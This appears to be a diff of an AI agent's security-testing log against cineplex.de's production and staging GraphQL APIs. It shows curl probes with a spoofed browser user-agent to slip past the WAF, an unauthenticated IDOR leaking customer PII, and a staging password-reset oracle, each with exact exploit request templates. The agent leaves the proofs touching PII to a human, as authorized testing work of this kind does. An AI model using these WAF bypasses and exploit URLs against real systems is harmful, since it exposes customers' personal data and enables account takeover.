@@ -15561,3 +15561,97 @@ STEP 6 — LEARNING
 
 STEP 7 — RISK
 [RISK] cineplex: 95 — Breadth sweep complete across remaining untouched inventory (18 hosts this cycle, 29 total): only new surfaces are two self-hosted analytics (Matomo+Umami, both correctly auth-gated) and a mailjet stub — no new exploitable surface. Core findings unchanged and live as of 09-12: systemic unauth'd IDOR control-complete (4/4 resolvers, 6/6 firing gates), staging testing_getConfirmationCode env-guard oracle (9+ cycles), prod+staging introspection (VALID CVSS 5.3, submission-ready), host-specific WAF GET reach stable. Ceiling holds at 95: the two Critical jumps (cross-tenant PII read, password-reset ATO) are HUMAN_ONLY under the program's customer/authentication-data rule and cannot be advanced passively.
+===== ANALYST bigpickle 2026-09-13 06:17:46 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mUA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+curl -s --http2 -A "$UA" -o /dev/null -D /tmp/opencode/sdr1.hdr -w "stg-userRegistrations %{http_code} %{size_download}\n" "https://graphql-api.app.staging.cineplex.de/userRegistrations?page=0&size=1"; sleep 1
+curl -s --http2 -A "$UA" -o /dev/null -D /tmp/opencode/sdr2.hdr -w "stg-userPasswordResets %{http_code} %{size_download}\n" "https://graphql-api.app.staging.cineplex.de/userPasswordResets?page=0&size=1"; sleep 1
+curl -s --http2 -A "$UA" -o /dev/null -D /tmp/opencode/sdr3.hdr -w "stg-root %{http_code} %{size_download}\n" "https://graphql-api.app.staging.cineplex.de/"; sleep 1
+curl -s --http2 -A "$UA" -o /dev/null -D /tmp/opencode/g1.hdr -w "prod-currentUser %{http_code} %{size_download}\n" "https://graphql-api.app.cineplex.de/?query=%7BcurrentUser%7Bid%7D%7D"; sleep 1
+curl -s --http2 -A "$UA" -o /dev/null -D /tmp/opencode/g2.hdr -w "prod-userById0 %{http_code} %{size_download}\n" "https://graphql-api.app.cineplex.de/?query=%7BuserById(id%3A%220%22)%7Bid%7D%7D"
+stg-userRegistrations 400 493
+stg-userPasswordResets 400 493
+stg-root 400 18
+prod-currentUser 200 836
+prod-userById0 200 744
+[0m
+[0m$ [0mfor f in /tmp/opencode/sdr1.hdr /tmp/opencode/sdr2.hdr; do echo "== $f =="; grep -iE "^(HTTP|server:|cf-cache-status|x-powered-by:|content-type:|cf-ray:)" "$f" 2>/dev/null; done
+== /tmp/opencode/sdr1.hdr ==
+HTTP/2 400 
+content-type: application/json; charset=utf-8
+x-powered-by: Express
+cf-cache-status: DYNAMIC
+server: cloudflare
+cf-ray: a3a50578db117d12-SJC
+== /tmp/opencode/sdr2.hdr ==
+HTTP/2 400 
+content-type: application/json; charset=utf-8
+x-powered-by: Express
+cf-cache-status: DYNAMIC
+server: cloudflare
+cf-ray: a3a505a27c6c15b4-SJC
+[0m
+[0m$ [0mUA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+curl -s --http2 -A "$UA" "https://graphql-api.app.staging.cineplex.de/userRegistrations?page=0&size=1" | head -c 300; echo; sleep 1
+curl -s --http2 -A "$UA" "https://graphql-api.app.staging.cineplex.de/userPasswordResets/search" | head -c 300
+{"errors":[{"message":"GraphQL operations must contain a non-empty `query` or a `persistedQuery` extension.","extensions":{"code":"INTERNAL_SERVER_ERROR","exception":{"stacktrace":["GraphQLError: GraphQL operations must contain a non-empty `query` or a `persistedQuery` extension.","    at processGra
+GET query missing.
+[0m
+STEP 1 — DELTA
+- CHANGED prod control live re-verified 2026-09-13: `currentUser` → 200 UNAUTHENTICATED (836B), `userById(id:"0")` → 200 INVALID_ID (744B) via curl --http2 browser-UA, no Authorization header — IDOR structural proof + control gate both live this cycle.
+- NEW client-differentiated WAF bypass is PATH-AGNOSTIC: staging GET `/userRegistrations` and `/userPasswordResets` (browser UA, --http2) → 400 native Express (`X-Powered-By: Express`, `cf-cache-status: DYNAMIC`, JSON) — not CF 403; bypass extends beyond `/` and `/?query=` to arbitrary paths.
+- NEW those JPA REST paths are NOT routed at origin: 400 bodies are Apollo fallthrough ("GraphQL operations must contain a non-empty query" / "GET query missing") — endpoints are internal-only (invoked inside gateway), no unauth CRUD surface passively.
+
+STEP 2 — PRIORITIZE
+- [PRIO] graphql-api.app.cineplex.de,7.75,attack_surface+business_value+GraphQL/JWT+gate_ease
+- [PRIO] graphql-api.app.staging.cineplex.de,6.75,gate_ease+GraphQL+env-guard
+- [PRIO] profil.cineplex.de,4.70,gate_ease+anomaly(freshness low)
+
+STEP 3 — HYPOTHESES
+[HYP] Production systemic IDOR via decodePublicId-before-auth (control-complete, live this cycle)
+class: IDOR
+asset: graphql-api.app.cineplex.de
+confidence: 95
+reasoning: Live 2026-09-13 via curl --http2 browser-UA, no Authorization header: `userById(id:"0"){id}` → 200 INVALID_ID (744B, decodePublicId path); `currentUser{id}` → 200 UNAUTHENTICATED (836B) on same surface. Control group 6/6 firing gates (errorStatistics, currentUser, searchUsers ROLE, adminUsers ROOT, userByQr DEVICE, voucherInstanceByQR POS) prove auth operates on siblings yet is omitted on the 4 id-resolvers (userById/invoice/order/ticket). WAF client-differentiated bypass now confirmed path-agnostic (any path reaches origin via curl). Decode-before-gate is a code defect, structural POC complete.
+evidence_needed: authless GET `userById(<tenantB publicId>){id email fullName}` → 200 with B's PII vs id:"0" INVALID_ID control; repeat invoice/order/ticket.
+verify_steps: curl --http2 -A <browser UA> `GET https://graphql-api.app.cineplex.de/?query=%7BuserById(id%3A%22<B-publicId>%22)%7Bid%20email%20fullName%7D%7D`; per-resolver id:"0" control; no Authorization header.
+impact: any unauth'd party enumerates arbitrary customers' PII (email/phone/birthDate/tickets/orders/invoices) → Critical ATO base.
+testability: HUMAN_ONLY
+
+[HYP] Staging env-guard omission on testing_getConfirmationCode (password-reset oracle)
+class: AUTH
+asset: graphql-api.app.staging.cineplex.de
+confidence: 85
+reasoning: Persisted 9+ cycles: authless 200 backend-hit (405-method-mismatch on internal /userPasswordResets/search) vs prod FORBIDDEN "only available in testing environments"; schema parity incl testing_forceDeleteUser; GET execution reach to origin confirmed again this cycle on arbitrary paths.
+evidence_needed: human POST extracting confirmation code for a seeded reset → ATO chain; forceDeleteUser mass delete.
+verify_steps: POST mutation `testing_getConfirmationCode(email:"<seed>")` on staging; human session only; prod FORBIDDEN control.
+impact: email-verification bypass → password-reset oracle → ATO; testing_forceDeleteUser → destructive delete.
+testability: HUMAN_ONLY
+
+[HYP] Unauthenticated email-keyed preference overwrite (profil)
+class: BUSLOGIC
+asset: profil.cineplex.de
+confidence: 45
+reasoning: /preference + /preference/update (200, ~103KB) anonymous JSESSIONID, no owner token; write keyed by submitted email/firstName/lastName/birth; reCAPTCHA disabled (sitekey 'false'); no passive reflector. No new evidence this cycle.
+evidence_needed: POST proof arbitrary-email field overwrite (A/B tester-owned emails).
+verify_steps: human POST with tester-owned email only; A/B shared-key check.
+impact: unauth overwrite of communication preferences → data-integrity low-med; email-presence oracle OOS-adjacent.
+testability: HUMAN_ONLY
+
+STEP 4 — SELF-CRITIQUE
+- [PARKED] profil_preference_surface: conf 45, no passive reflector, write-proof HUMAN_ONLY, business value low; unchanged 2 cycles; keep parked, drop from finals.
+- [FINAL] 1) IDOR decode-before-auth @ graphql-api.app.cineplex.de (95, control-complete, live this cycle) 2) staging testing_getConfirmationCode env-guard oracle @ graphql-api.app.staging.cineplex.de (85, 9+ cycles).
+- Both finals require HUMAN_ONLY PII/authentication-data proof per program rule; nothing passive can advance them.
+
+STEP 5 — NEXT ACTION
+[NEXT] HUMAN: cross-tenant IDOR proof — accounts A/B; authless `curl --http2 -A <browser UA>` `GET https://graphql-api.app.cineplex.de/?query=%7BuserById(id%3A%22<B-publicId>%22)%7Bid%20email%20fullName%7D%7D` plus invoice/order/ticket on B's publicId with per-resolver `id:"0"` INVALID_ID control, no Authorization header; 200-with-B-PII vs INVALID_ID lifts the structural POC to demonstrated Critical.
+
+STEP 6 — LEARNING
+- [LEARN] ACCEPTED idor_booking @ graphql-api.app.cineplex.de: control pair re-verified live 2026-09-13 (currentUser 836B UNAUTHENTICATED vs userById0 744B INVALID_ID); structural proof + control gate stable.
+- [LEARN] ACCEPTED waf_method_gate_attenuation @ graphql-api.app.{,staging.}cineplex.de: path-agnostic client-differentiated bypass — arbitrary staging paths reach origin (400 native Express) via curl; automated urllib 403; bypass not limited to `/` or GraphQL routes.
+- [LEARN] REJECTED staging_jpa_crud_exposed @ graphql-api.app.staging.cineplex.de: /userRegistrations + /userPasswordResets not routed at origin (Apollo GET-400 fallthrough, "must contain a non-empty query"); internal-only endpoints, no unauth CRUD surface passively.
+
+STEP 7 — RISK
+[RISK] cineplex: 95 — Core findings re-confirmed live this cycle (IDOR control pair 200/200 both envs-identical, control gate UNAUTHENTICATED; path-agnostic WAF reach stable). No new exploitable surface from staging JPA paths (internal-only). Ceiling holds at 95: the two Critical jumps (cross-tenant PII read, password-reset ATO) are HUMAN_ONLY under the program's customer/authentication-data rule and cannot be advanced passively.
